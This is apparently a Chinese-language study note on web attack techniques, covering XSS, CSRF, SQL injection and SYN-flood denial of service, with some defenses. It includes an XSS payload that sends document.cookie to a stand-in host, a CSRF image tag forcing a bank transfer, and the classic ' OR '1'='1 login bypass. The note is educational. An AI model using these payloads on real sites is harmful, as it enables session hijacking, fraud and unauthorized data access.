зҪ‘з»ңж”»еҮ»жҠҖжңҜ

2021/11/26 ComputerNetwork е…ұ 1970 еӯ—пјҢзәҰ 6 еҲҶй’ҹ

зҪ‘з»ңж”»еҮ»жҠҖжңҜ

XSSи·Ёз«ҷи„ҡжң¬жҠҖжңҜ

и·Ёз«ҷи„ҡжң¬ж”»еҮ»пјҲCross-Site Scripting, XSSпјүпјҢеҸҜд»Ҙе°Ҷд»Јз ҒжіЁе…ҘеҲ°з”ЁжҲ·жөҸи§Ҳзҡ„зҪ‘йЎөдёҠпјҢиҝҷз§Қд»Јз ҒеҢ…жӢ¬ HTML е’Ң JavaScriptгҖӮ

дҫӢеҰӮжңүдёҖдёӘи®әеқӣзҪ‘з«ҷпјҢж”»еҮ»иҖ…еҸҜд»ҘеңЁдёҠйқўеҸ‘еёғд»ҘдёӢеҶ…е®№пјҡ

<script>location.href="//domain.com/?c=" + document.cookie</script>

д№ӢеҗҺиҜҘеҶ…е®№еҸҜиғҪдјҡиў«жёІжҹ“жҲҗд»ҘдёӢеҪўејҸпјҡ

<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>

еҸҰдёҖдёӘз”ЁжҲ·жөҸи§ҲдәҶеҗ«жңүиҝҷдёӘеҶ…е®№зҡ„йЎөйқўе°Ҷдјҡи·іиҪ¬еҲ° domain.com е№¶жҗәеёҰдәҶеҪ“еүҚдҪңз”Ёеҹҹзҡ„ CookieгҖӮеҰӮжһңиҝҷдёӘи®әеқӣзҪ‘з«ҷйҖҡиҝҮ Cookie з®ЎзҗҶз”ЁжҲ·зҷ»еҪ•зҠ¶жҖҒпјҢйӮЈд№Ҳж”»еҮ»иҖ…е°ұеҸҜд»ҘйҖҡиҝҮиҝҷдёӘ Cookie зҷ»еҪ•иў«ж”»еҮ»иҖ…зҡ„иҙҰеҸ·дәҶгҖӮ

еҚұе®і

  • зӘғеҸ–з”ЁжҲ·зҡ„ Cookie
  • дјӘйҖ иҷҡеҒҮзҡ„иҫ“е…ҘиЎЁеҚ•йӘ—еҸ–дёӘдәәдҝЎжҒҜ
  • жҳҫзӨәдјӘйҖ зҡ„ж–Үз« жҲ–иҖ…еӣҫзүҮ

йҳІиҢғ

  1. и®ҫзҪ® Cookie дёә HttpOnly

и®ҫзҪ®дәҶ HttpOnly зҡ„ Cookie еҸҜд»ҘйҳІжӯў JavaScript и„ҡжң¬и°ғз”ЁпјҢе°ұж— жі•йҖҡиҝҮ document.cookie иҺ·еҸ–з”ЁжҲ· Cookie дҝЎжҒҜгҖӮ

  1. иҝҮж»Өзү№ж®Ҡеӯ—з¬Ұ

дҫӢеҰӮе°Ҷ < иҪ¬д№үдёә <пјҢе°Ҷ > иҪ¬д№үдёә >пјҢд»ҺиҖҢйҒҝе…Қ HTML е’Ң Jascript д»Јз Ғзҡ„иҝҗиЎҢгҖӮ

еҜҢж–Үжң¬зј–иҫ‘еҷЁе…Ғи®ёз”ЁжҲ·иҫ“е…Ҙ HTML д»Јз ҒпјҢе°ұдёҚиғҪз®ҖеҚ•ең°е°Ҷ < зӯүеӯ—з¬ҰиҝӣиЎҢиҝҮж»ӨдәҶпјҢжһҒеӨ§ең°жҸҗй«ҳдәҶ XSS ж”»еҮ»зҡ„еҸҜиғҪжҖ§гҖӮ

еҜҢж–Үжң¬зј–иҫ‘еҷЁйҖҡеёёйҮҮз”Ё XSS filter жқҘйҳІиҢғ XSS ж”»еҮ»пјҢйҖҡиҝҮе®ҡд№үдёҖдәӣж ҮзӯҫзҷҪеҗҚеҚ•жҲ–иҖ…й»‘еҗҚеҚ•пјҢд»ҺиҖҢдёҚе…Ғи®ёжңүж”»еҮ»жҖ§зҡ„ HTML д»Јз Ғзҡ„иҫ“е…ҘгҖӮ

CSRFи·Ёз«ҷиҜ·жұӮдјӘйҖ 

и·Ёз«ҷиҜ·жұӮдјӘйҖ пјҲCross-site request forgeryпјҢCSRFпјүпјҢжҳҜж”»еҮ»иҖ…йҖҡиҝҮдёҖдәӣжҠҖжңҜжүӢж®өж¬әйӘ—з”ЁжҲ·зҡ„жөҸи§ҲеҷЁеҺ»и®ҝй—®дёҖдёӘиҮӘе·ұжӣҫз»Ҹи®ӨиҜҒиҝҮзҡ„зҪ‘з«ҷе№¶жү§иЎҢдёҖдәӣж“ҚдҪңпјҲеҰӮеҸ‘йӮ®д»¶пјҢеҸ‘ж¶ҲжҒҜпјҢз”ҡиҮіиҙўдә§ж“ҚдҪңеҰӮиҪ¬иҙҰе’Ңиҙӯд№°е•Ҷе“ҒпјүгҖӮз”ұдәҺжөҸи§ҲеҷЁжӣҫз»Ҹи®ӨиҜҒиҝҮпјҢжүҖд»Ҙиў«и®ҝй—®зҡ„зҪ‘з«ҷдјҡи®ӨдёәжҳҜзңҹжӯЈзҡ„з”ЁжҲ·ж“ҚдҪңиҖҢеҺ»жү§иЎҢгҖӮ

XSS еҲ©з”Ёзҡ„жҳҜз”ЁжҲ·еҜ№жҢҮе®ҡзҪ‘з«ҷзҡ„дҝЎд»»пјҢCSRF еҲ©з”Ёзҡ„жҳҜзҪ‘з«ҷеҜ№з”ЁжҲ·жөҸи§ҲеҷЁзҡ„дҝЎд»»гҖӮ

еҒҮеҰӮдёҖе®¶й“¶иЎҢз”Ёд»Ҙжү§иЎҢиҪ¬иҙҰж“ҚдҪңзҡ„ URL ең°еқҖеҰӮдёӢпјҡ

http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeNameгҖӮ

йӮЈд№ҲпјҢдёҖдёӘжҒ¶ж„Ҹж”»еҮ»иҖ…еҸҜд»ҘеңЁеҸҰдёҖдёӘзҪ‘з«ҷдёҠж”ҫзҪ®еҰӮдёӢд»Јз Ғпјҡ

<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">гҖӮ

еҰӮжһңжңүиҙҰжҲ·еҗҚдёә Alice зҡ„з”ЁжҲ·и®ҝй—®дәҶжҒ¶ж„Ҹз«ҷзӮ№пјҢиҖҢеҘ№д№ӢеүҚеҲҡи®ҝй—®иҝҮй“¶иЎҢдёҚд№…пјҢзҷ»еҪ•дҝЎжҒҜе°ҡжңӘиҝҮжңҹпјҢйӮЈд№ҲеҘ№е°ұдјҡжҚҹеӨұ 1000 зҫҺе…ғгҖӮ

SQL жіЁе…Ҙж”»еҮ»

жҰӮеҝө

жңҚеҠЎеҷЁдёҠзҡ„ж•°жҚ®еә“иҝҗиЎҢйқһжі•зҡ„ SQL иҜӯеҸҘпјҢдё»иҰҒйҖҡиҝҮжӢјжҺҘжқҘе®ҢжҲҗгҖӮ

ж”»еҮ»еҺҹзҗҶ

дҫӢеҰӮдёҖдёӘзҪ‘з«ҷзҷ»еҪ•йӘҢиҜҒзҡ„ SQL жҹҘиҜўд»Јз Ғдёәпјҡ

strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"

еҰӮжһңеЎ«е…Ҙд»ҘдёӢеҶ…е®№пјҡ

userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";

йӮЈд№Ҳ SQL жҹҘиҜўеӯ—з¬ҰдёІдёәпјҡ

strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"

жӯӨж—¶ж— йңҖйӘҢиҜҒйҖҡиҝҮе°ұиғҪжү§иЎҢд»ҘдёӢжҹҘиҜўпјҡ

strSQL = "SELECT * FROM users;"

DoSжӢ’з»қжңҚеҠЎж”»еҮ»

жӢ’з»қжңҚеҠЎж”»еҮ»пјҲdenial-of-service attackпјҢDoSпјүпјҢдәҰз§°жҙӘж°ҙж”»еҮ»пјҢе…¶зӣ®зҡ„еңЁдәҺдҪҝзӣ®ж Үз”өи„‘зҡ„зҪ‘з»ңжҲ–зі»з»ҹиө„жәҗиҖ—е°ҪпјҢдҪҝжңҚеҠЎжҡӮж—¶дёӯж–ӯжҲ–еҒңжӯўпјҢеҜјиҮҙе…¶жӯЈеёёз”ЁжҲ·ж— жі•и®ҝй—®гҖӮ

еҲҶеёғејҸжӢ’з»қжңҚеҠЎж”»еҮ»пјҲdistributed denial-of-service attackпјҢDDoSпјүпјҢжҢҮж”»еҮ»иҖ…дҪҝз”ЁдёӨдёӘжҲ–д»ҘдёҠиў«ж”»йҷ·зҡ„з”өи„‘дҪңдёәвҖңеғөе°ёвҖқеҗ‘зү№е®ҡзҡ„зӣ®ж ҮеҸ‘еҠЁвҖңжӢ’з»қжңҚеҠЎвҖқејҸж”»еҮ»гҖӮ

SYN жіӣжҙӘж”»еҮ»

жҜ”еҰӮSYN Dosж”»еҮ»е°ұжҳҜDoSж”»еҮ»зҡ„дёҖз§ҚпјҢ

еңЁ SYN жіӣжҙӘж”»еҮ»дёӯпјҢжҒ¶ж„Ҹе®ўжҲ·з«ҜеҸ‘йҖҒеӨ§йҮҸ SYN ж•°жҚ®еҢ…пјҲйҖҡеёёеңЁжҸЎжүӢзҡ„з¬¬дёҖйғЁеҲҶпјүпјҢдҪҶж°ёиҝңдёҚдјҡеҸ‘йҖҒзЎ®и®Өд»Ҙе®ҢжҲҗжҸЎжүӢгҖӮиҝҷдҪҝеҫ—жңҚеҠЎеҷЁдёҖзӣҙзӯүеҫ…еҜ№дәҺиҝҷдәӣеҚҠејҖж”ҫзҡ„ TCP иҝһжҺҘзҡ„е“Қеә”пјҢиҖҢиҝҷдәӣиҝһжҺҘжңҖз»ҲдјҡиҖ—е°Ҫе®№йҮҸпјҢйҖ жҲҗжңҚеҠЎеҷЁж— жі•жҺҘеҸ—и·ҹиёӘиҝһжҺҘзҠ¶жҖҒзҡ„ж–°иҝһжҺҘгҖӮ

SYN жіӣжҙӘж”»еҮ»е°ұеҘҪеғҸдёҖжүҖеӨ§еһӢй«ҳдёӯйҮҢпјҢж•ҙдёӘжҜ•дёҡзҸӯзҡ„дёҖеңәеҸҜжҖ•жҒ¶дҪңеү§ - жүҖжңүеӯҰз”ҹеңЁеҗҢдёҖж—¶й—ҙж®өеҶ…жү“з”өиҜқз»ҷеҗҢдёҖе®¶жҠ«иҗЁеә—пјҢжҜҸдёӘдәәйғҪиҰҒи®ўдёӘжҠ«иҗЁгҖӮеңЁйҖҒйӨҗе‘ҳеӨҮиҙ§ж—¶пјҢеҘ№дјҡеҸ‘зҺ°ж”¶еҲ°дәҶеӨӘеӨҡзҡ„жҠ«иҗЁи®ўеҚ•пјҢеӨ–еҚ–иҪҰж №жң¬иЈ…дёҚдёӢпјҢиҖҢдё”и®ўеҚ•дёҠд№ҹжІЎжңүең°еқҖпјҢжүҖд»ҘжүҖжңүйҖҒйӨҗйғҪдјҡеҒңжӯўгҖӮ

еҸӮиҖғ

  • ж”»еҮ»жҠҖжңҜ
  • д»Җд№ҲжҳҜ DDoS ж”»еҮ»пјҹ
